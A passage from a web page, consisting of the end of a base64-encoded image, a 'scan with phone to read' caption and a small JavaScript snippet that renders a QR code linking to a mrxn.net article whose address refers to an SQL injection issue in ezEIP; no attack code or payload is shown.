k8nTm+Fbkm/c8jTAMFVzjpITi72Ohhz3Zfv0V4d95lnrq2HcQ/qqx76ojk5pB8E1QuvN6RO4Y3W9o0hZFowont1yhC/c3MdIfmur+oheQj2Oohu/d6HeHutruGxDvEhWDW1YOSlPbPcmwiP+5grvN6QZ074FzOnA4FMF4I1xVp9j6XtFyRvDsIhqG4NjLq+aE5U/wrCc/f4Ss/KwrwvjDqMfPa5nA6kbnit3zuB7assb+nURHURximrr9A+n/jv/T9Dbh7ST19dLkJy+jDy0s2Kpe3XSjcDY8+eh9G3rufUxTPfXOH1htQpvNHaBuIUYXwK1N1z5+oipN4chOuLEN2cugjxIagururKh9RAsLRHy14ijHXq9uhcXYTU91znkJx1hdtAilzr9Sdw+D7kbEuQqULQPMy5TwWMvnUixDffsecgeTjiqtYeHWHsYb05iP8s/24OuF1vyO29Pg5fZbk9yFMBQZ8a0ZxcVBdhrIdwfXFV/6xvrhByDwjaG8IrU0u9rmcLxnzPwNy3rwjJyR/h9Yb0U34x3wbSp+a+1CFThuCZvqo/0yH9zUE4BL3vDK0RzXQO6dV1eUf7iPpyUV2E3Kf7EN3cHreB7MXr+nUnsH2V1bfQpyoXzXcO4/Rh5OYhutx+Hc98SB/g/i8A5gshnj1h5F2vmlow5iAcgtY9i/C4DuID11dZtzf7OPyRBZmW+4RwmKM5sZ6wWvKOkD6VqdX90mpBcvql1ZLD6JcOR+2RXt5s1X32a5bZazDeF8L3Pep6X1PXcMwdBlLBa73uBJYDgeP0asquvmV1SN3KN9d9OYz1EA4j2meP9hD15OJKh9zDHIy810F8dQi3XoToEFS3Tl64HEiZ1/r9E9gGApmeUxPdEsSHYNflva5zczDvY140L6708rsHuUfXK1sL4tf1TyzvI0L6y72HHOKrF24DKXKt15/AYSCQqUHQLTrVjvowz8OoQ7h9YOT262i+6494r5HD/J76q56QOn3zEB1G7L7c+hkeBjILXdrvncDyX3tX04Q8BW6x52DuQ/Set48Iyck7Qnz4PvaenUN6327dCT/7HJK63f/PQcBt9WEfYMteb8jqtF6kb/+W5bTE1X66D5mu+ZW/0q2D9DEH4fodzc1wlVW3BsZ7wMjNi9bJYczrd1zl1ff56w3xVN4Et79DINOG53C1f0h992HUfSrMnXEY662D6IDShvYE7n9Ga8DI1Tta33X5yofH/WHtX2+Ip/smuA3EaZ/hat/WfdW3DsanBsL1xd5fvbB7nVdmtsx1T12E7AlG1BftIxe7DmMf4Pp5yO3NPrY3xH3BcWqA9o8hMPy53p+ezmHMQzgc0U1CvM5h1PVFiA9BdffUUR+ShxG7Lxf3/Q4DMXTha07grwfidFfb7z7k6Vnp9oHkINjz8j1a29GMeufqYvc7h+wJgt0/4/oipA9w/R1ye7OPv35D+uczmzqwxfQ34c+FOnD/u0UuwqhDOHzin1aH//VJ1+GzBtC+3xc++WacXAD3Wvd6Er9ngS1mXeGPD2S7y3XxrRM4DKSmNFvf6v5EEXB/Yp6IDhH3uBfVYOwJ4RDc19S1dXU9W5A6CJo5qzvzYexXfQ8DKfFarzuBbSCQacFjXG0VUrfyV7pPEaS+cxh1+8CoV51eXdeCY6b0viA561fY68ypw9gHRm7OOhGSA66vsm5v9rG9IW+2r//sdv4HAAD//64j9swAAAAGSURBVAMA5nlunvKf3j8AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ezEIP-whir\_system-onlyvalid-fieldname-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 